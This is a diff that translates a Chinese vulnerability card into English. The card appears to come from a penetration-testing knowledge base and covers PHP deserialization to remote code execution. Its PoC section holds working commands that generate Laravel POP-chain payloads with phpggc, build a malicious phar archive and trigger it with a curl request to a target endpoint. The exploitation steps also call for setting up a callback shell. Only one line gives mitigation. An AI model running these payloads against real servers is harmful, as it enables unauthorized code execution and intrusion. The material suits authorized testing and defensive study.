@@ -1,58 +1,58 @@
 ﻿---
-title: PHP 反序列化（POP 链 → RCE / phar 触发）
-cve: 无（实现缺陷）
+title: PHP deserialization (POP chain → RCE / phar trigger)
+cve: None (implementation flaw)
 severity: critical
 cvss: 9.0
-product: Laravel / Symfony / ThinkPHP / 自研 PHP
-versions: 任意
+product: Laravel / Symfony / ThinkPHP / custom PHP applications
+versions: Any
 ports: 80, 443
-keywords: php, 反序列化, pop链, phar, unserialize, rce
-entry: unserialize($_COOKIE) / phar:// 文件操作
+keywords: php, deserialization, pop chain, phar, unserialize, rce
+entry: unserialize($_COOKIE) / phar:// file operations
 verified: false
-sources: 公开资料整理（实现缺陷类）
+sources: Compiled from public sources (implementation flaws)
 ---
 
-## 指纹
+## Fingerprinting
 
-- Cookie/参数是 `O:8:"stdClass":...` 或 base64 后的序列化串；
-- 上传点会做 `file_exists`/`getimagesize` 之类的文件操作，且路径可控。
+- A cookie/parameter contains `O:8:"stdClass":...` or a base64-encoded serialized string;
+- An upload endpoint performs file operations such as `file_exists`/`getimagesize`, and the path is controllable.
 
-## 前置条件
+## Prerequisites
 
-- 有 `unserialize` 入口，或可控 `phar://` 路径；框架版本有可用 POP 链。
+- An `unserialize` entry point or a controllable `phar://` path exists; a POP chain is available for the framework version.
 
 ## PoC
 
 ```bash
-# 1) 识别序列化数据
+# 1) Identify serialized data
 echo 'TzoyMDoi...' | base64 -d 2>/dev/null | head -c 60
-# 形如 O:4:"Test":1:{...} = 序列化串
+# A value such as O:4:"Test":1:{...} = serialized string
 ```
 
 ```bash
-# 2) 生成 POP 链（Laravel 用 phpggc，ThinkPHP 用公开链）
+# 2) Generate a POP chain (phpggc for Laravel; public chains for ThinkPHP)
 git clone https://github.com/ambionics/phpggc.git && cd phpggc
 php phpggc Laravel/RCE9 system id -b
-# 输出 base64，塞进触发参数
+# Output base64 and place it in the triggering parameter
 
-# 3) phar 触发（无 unserialize 也能打）
+# 3) Trigger through phar (exploitable even without unserialize)
 php -d phar.readonly=0 phpggc -p phar -o /tmp/p.phar Laravel/RCE9 system id
-# 上传 p.phar，再让接口用 phar:// 打开（file_exists 等）
+# Upload p.phar, then make the endpoint open it through phar:// (file_exists, etc.)
 curl -s 'https://target/api/avatar?src=phar:///tmp/p.phar/x' | head -c 200
-# 判定：执行 id 有回显 = 命中
+# Result: executing id returns output = positive result
 ```
 
-## 利用步骤
+## Exploitation Steps
 
-1. 找反序列化入口（Cookie/Token/缓存）；
-2. `phpggc -l` 找可用链（按框架/版本）；
-3. 先 `id`，再回连；
-4. 证据：回显/回连日志。
+1. Find a deserialization entry point (Cookie/Token/cache);
+2. Use `phpggc -l` to find an available chain (by framework/version);
+3. Run `id` first, then establish a callback;
+4. Evidence: output/callback logs.
 
-## 修复与缓解
+## Remediation and Mitigation
 
-- 不用 `unserialize`（用 JSON）；必须用时加签名/HMAC；禁 `phar://`。
+- Avoid `unserialize` (use JSON); if required, add signatures/HMAC; block `phar://`.
 
-## 参考
+## References
 
-- phpggc；PHP 对象注入研究。
+- phpggc; PHP object injection research.
